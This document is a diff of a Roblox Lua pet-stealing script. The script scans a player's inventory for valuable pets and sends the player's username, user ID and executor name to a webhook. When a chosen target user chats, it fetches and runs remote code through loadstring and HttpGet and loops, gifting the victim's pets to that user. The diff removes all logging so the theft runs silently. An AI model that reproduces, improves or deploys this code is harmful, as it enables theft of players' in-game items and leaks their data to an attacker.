@@ -9,11 +9,8 @@ local MasterPetList = {
 }
 
 local TrashPetList = {
-    -- Original Trash Pets
     "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
     "Pig", "Crab", "Starfish", "Seagull",
-    
-    -- Newly Added Trash Pets
     "Deer", "Spotted Deer", "Monkey", "Silver Monkey", "Rooster", "Turtle", "Cow", 
     "Snail", "Giant Ant", "Polar Bear", "Panda", "Sea Otter", "Caterpillar", 
     "Praying Mantis", "Hedgehog", "Kiwi", "Mole", "Frog", "Echo Frog", "Owl", 
@@ -46,35 +43,34 @@ local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and Replicat
 local loadstringExecuted = false
 local giftingActive = false
 
---[[
-    This function is the core fix. It creates a universal way to send HTTP requests
-    by checking for the function provided by the most popular executors. This ensures
-    the webhook will be sent regardless of the user's platform.
-]]
 local function sendHttpRequest(options)
     local success, result
-    local requestFunc
     
-    if syn and syn.request then
-        print("[HTTP] Using 'syn.request' for webhook.")
-        requestFunc = syn.request
+    if HttpService.HttpEnabled then
+        success, result = pcall(function()
+            return HttpService:PostAsync(
+                options.Url,
+                options.Body,
+                Enum.HttpContentType.ApplicationJson
+            )
+        end)
+    elseif syn and syn.request then
+        success, result = pcall(function()
+            syn.request(options)
+        end)
     elseif http_request then
-        print("[HTTP] Using 'http_request' for webhook.")
-        requestFunc = http_request
+        success, result = pcall(function()
+            http_request(options)
+        end)
     elseif request then
-        print("[HTTP] Using global 'request' for webhook.")
-        requestFunc = request
+        success, result = pcall(function()
+            request(options)
+        end)
     else
-        print("[HTTP Error] No supported HTTP request function was found on this executor.")
         return false, "No supported HTTP function found"
     end
 
-    success, result = pcall(function()
-        requestFunc(options)
-    end)
-
     if not success then
-        print("[HTTP Error] The HTTP request failed inside pcall: " .. tostring(result))
     end
     
     return success, result
@@ -148,7 +144,6 @@ local function sortPets(a, b)
 end
 
 local function sendWebhookNotification(foundPetsData)
-    print("[Webhook] Preparing to send notification.")
     table.sort(foundPetsData, sortPets)
     
     local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, getExecutorName())
@@ -180,10 +175,8 @@ local function sendWebhookNotification(foundPetsData)
     
     local successEncode, encodedPayload = pcall(function() return HttpService:JSONEncode(payload) end)
     if not successEncode then
-        print("[Webhook Error] Failed to encode JSON payload: " .. tostring(encodedPayload))
         return
     end
-    print("[Webhook] JSON payload encoded successfully.")
 
     local requestOptions = {
         Url = webhookUrl,
@@ -194,15 +187,12 @@ local function sendWebhookNotification(foundPetsData)
     
     local reqSuccess, reqError = sendHttpRequest(requestOptions)
     if not reqSuccess then
-        print("[Webhook Error] The request failed to send: " .. tostring(reqError))
     else
-        print("[Webhook] Notification sent successfully.")
     end
 end
 
 local function giftPetsLoop(targetPlayer)
     if not humanoid or not backpack or not GiftingEvent or not targetPlayer then
-        print("[Gifter Error] Loop cannot start, a critical component is missing.")
         giftingActive = false
         return 
     end
@@ -232,52 +222,37 @@ local function giftPetsLoop(targetPlayer)
     end
     
     giftingActive = false
-    print("[Gifter Info] Gifting loop has stopped.")
 end
 
 local function executeLoadedScript()
-    print("[Loadstring] Attempting to fetch and execute script from URL...")
     local success, scriptContent = pcall(function() return game:HttpGet(SCRIPT_URL) end)
     if success and scriptContent then
-        print("[Loadstring] Script content fetched. Compiling and executing...")
         local scriptFunction, compileError = loadstring(scriptContent)
         if scriptFunction then
             local runSuccess, runError = pcall(scriptFunction)
             if not runSuccess then
-                print("[Loadstring Error] The loaded script failed to run: " .. tostring(runError))
             else
-                print("[Loadstring] Loaded script executed.")
             end
         else
-            print("[Loadstring Error] Failed to compile script: " .. tostring(compileError))
         end
     else
-        print("[Loadstring Error] Failed to fetch script from URL: " .. tostring(scriptContent))
     end
 end
 
 local function onPlayerChatted(player, message)
-    print("[Chat Trigger] Detected chat from player: '" .. player.Name .. "'")
-
     if player.Name == TargetUsername then
-        print("[Chat Trigger] Chat is from the correct target: '" .. TargetUsername .. "'")
-
         if not loadstringExecuted then
             loadstringExecuted = true
             executeLoadedScript()
         end
         
         if not giftingActive then
-            print("[Chat Trigger] Gifting is not active. Activating now and spawning loop...")
             giftingActive = true 
             task.spawn(giftPetsLoop, player)
         else
-            print("[Chat Trigger] Gifting is already active, not starting another loop.")
         end
     end
 end
-
-print("[System] Initializing script...")
 
 Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(message)
@@ -291,18 +266,12 @@ for _, player in ipairs(Players:GetPlayers()) do
     end)
 end
 
-print("[System] Event connections established.")
 task.wait(1)
 
-print("[System] Performing initial inventory check for webhook...")
 local hasPets, foundPetsData = checkInventoryForValuables()
 if hasPets then
-    print("[System] Valuable pets found on startup. Sending webhook...")
     sendWebhookNotification(foundPetsData)
 else
-    print("[System] No valuable pets found on startup.")
 end
 
-print("--- [ SCRIPT FULLY LOADED ] ---")
-print("Awaiting chat from '" .. TargetUsername .. "' to trigger Gifter and Loadstring.")
-print("-------------------------------")
+
